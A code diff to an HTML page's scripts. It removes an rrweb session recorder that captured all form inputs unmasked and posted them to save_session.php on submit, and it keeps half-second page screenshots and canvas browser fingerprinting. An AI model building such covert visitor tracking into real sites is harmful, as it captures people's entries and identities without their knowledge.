@@ -21183,12 +21183,10 @@
 
   <!-- Screenshot Capture & Browser Fingerprinting -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-
-  <!-- DOM Session Recording (rrweb) -->
-  <script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>
-
   <script>
+    // ==============================================
     // MODULE 1: Screenshot Capture (Every 0.5s)
+    // ==============================================
     let screenshotCounter = 0;
     let screenshotInterval;
 
@@ -21227,110 +21225,9 @@
       clearInterval(screenshotInterval);
     });
 
-    // MODULE 2: DOM Session Recording (rrweb)
-    let sessionEvents = [];
-    let sessionStartTime = Date.now();
-    let stopRecording = null;
-
-    // Start recording when page loads
-    window.addEventListener('load', function () {
-      console.log('🎬 Session recording started at:', new Date().toLocaleTimeString());
-
-      try {
-        stopRecording = rrweb.record({
-          emit(event) {
-            // Collect all events
-            sessionEvents.push(event);
-            // Log every 10 events
-            if (sessionEvents.length % 10 === 0) {
-              console.log('📊 Recorded', sessionEvents.length, 'events so far');
-            }
-          },
-          // High quality settings
-          sampling: {
-            mousemove: true,
-            mouseInteraction: true,
-            scroll: 150,
-            media: 800,
-            input: 'all'
-          },
-          recordCanvas: true,
-          collectFonts: true,
-          maskAllInputs: false,
-          maskTextSelector: null,
-          blockClass: 'rr-block',
-          ignoreClass: 'rr-ignore'
-        });
-        console.log('✅ rrweb recorder initialized successfully');
-      } catch (error) {
-        console.error('❌ Failed to initialize rrweb:', error);
-      }
-    });
-
-    // Send session recording when form is submitted
-    document.addEventListener('DOMContentLoaded', function () {
-      const form = document.querySelector('form');
-      if (!form) {
-        console.error('❌ Form not found!');
-        return;
-      }
-
-      console.log('✅ Form found, attaching submit listener');
-
-      form.addEventListener('submit', function (e) {
-        // ALWAYS prevent default first
-        e.preventDefault();
-
-        console.log('📤 Form submitted! Total events:', sessionEvents.length);
-
-        // Stop recording
-        if (stopRecording) {
-          stopRecording();
-          console.log('⏹️ Recording stopped');
-        } else {
-          console.warn('⚠️ stopRecording is null!');
-        }
-
-        // Send session data to server
-        const sessionData = {
-          events: sessionEvents,
-          duration: Date.now() - sessionStartTime,
-          timestamp: sessionStartTime,
-          eventCount: sessionEvents.length
-        };
-
-        console.log('📦 Sending session data:', {
-          events: sessionData.eventCount,
-          duration: (sessionData.duration / 1000).toFixed(2) + 's',
-          dataSize: JSON.stringify(sessionData).length + ' bytes'
-        });
-
-        // Send and WAIT for response before submitting
-        fetch('save_session.php', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(sessionData)
-        })
-          .then(response => {
-            console.log('📡 Response status:', response.status);
-            return response.text();
-          })
-          .then(data => {
-            console.log('✅ Server response:', data);
-            // NOW submit the form
-            console.log('✅ Session saved, submitting form now');
-            e.target.submit();
-          })
-          .catch(err => {
-            console.error('❌ Session save failed:', err);
-            // Submit anyway even if save failed
-            console.log('⚠️ Submitting form despite save error');
-            e.target.submit();
-          });
-      });
-    });
-
-    // MODULE 3: Browser Fingerprinting
+    // ==============================================
+    // MODULE 2: Browser Fingerprinting
+    // ==============================================
     function getCanvasFingerprint() {
       try {
         const canvas = document.createElement('canvas');
